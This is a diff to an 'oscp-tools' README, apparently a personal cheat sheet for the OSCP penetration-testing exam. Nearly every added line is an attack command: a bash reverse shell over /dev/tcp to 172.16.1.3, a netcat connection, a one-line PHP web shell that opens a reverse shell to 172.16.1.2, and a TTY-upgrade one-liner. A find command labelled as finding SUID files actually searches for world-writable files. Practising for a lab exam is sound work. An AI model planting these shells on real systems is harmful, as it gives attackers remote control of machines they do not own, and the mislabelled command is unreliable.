@@ -1,3 +1,23 @@
+
+Upgrade Your Shellz
+python -c 'import pty; pty.spawn("/bin/bash");'
+
+Alternative Shell
+bash -i >& /dev/tcp/172.16.1.3/8080 0>&1
+
+nc 172.16.1.2 443
+
+Tiny PHP Shell
+<?php exec("/bin/bash -c 'bash -i > &/dev/tcp/172.16.1.2/8081 0>&1'"); ?>
+
+
+
+Priv Esc
+Find SUID Files in /etc
+find /etc -perm -2 -type f 2>/dev/null
+
+
+
 # oscp-tools
 List of tools and commands used for OSCP
 
